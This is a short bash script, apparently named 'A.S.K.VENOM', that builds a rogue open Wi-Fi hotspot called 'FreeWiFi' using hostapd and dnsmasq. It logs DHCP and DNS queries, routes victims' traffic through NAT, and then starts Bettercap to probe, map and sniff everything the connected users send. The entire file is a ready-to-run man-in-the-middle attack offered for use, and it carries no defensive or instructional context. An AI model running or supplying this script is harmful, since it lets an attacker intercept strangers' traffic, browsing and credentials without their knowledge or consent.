#!/bin/bash

if [[ $EUID -ne 0 ]]; then
   echo "Run as root"
   exit 1
fi

WIFI_IF="wlan0"
ETH_IF="eth0"
FAKE_SSID="FreeWiFi"
FAKE_NET="192.168.10.0/24"
GATEWAY_IP="192.168.10.1"

echo "[*] Setting up fake AP A.S.K.VENOM..."

cat > /tmp/hostapd.conf <<EOF
interface=$WIFI_IF
driver=nl80211
ssid=$FAKE_SSID
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

cat > /tmp/dnsmasq.conf <<EOF
interface=$WIFI_IF
dhcp-range=192.168.10.10,192.168.10.100,12h
dhcp-option=3,$GATEWAY_IP
dhcp-option=6,$GATEWAY_IP
server=8.8.8.8
log-queries
log-dhcp
EOF

echo "[*] Configuring interfaces..."

ip addr flush dev $WIFI_IF
ip addr add $GATEWAY_IP/24 dev $WIFI_IF
ip link set $WIFI_IF up

echo "[*] Enabling IP forwarding and setting up iptables..."

sysctl -w net.ipv4.ip_forward=1

iptables -t nat -F
iptables -F
iptables -A FORWARD -i $ETH_IF -o $WIFI_IF -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i $WIFI_IF -o $ETH_IF -j ACCEPT
iptables -t nat -A POSTROUTING -o $ETH_IF -j MASQUERADE

echo "[*] Starting hostapd and dnsmasq..."

hostapd /tmp/hostapd.conf > /tmp/hostapd.log 2>&1 &
sleep 2
dnsmasq -C /tmp/dnsmasq.conf

echo "[*] Starting Bettercap to sniff traffic..."

bettercap -iface $WIFI_IF -eval "net.probe on; net.recon on; net.sniff on"
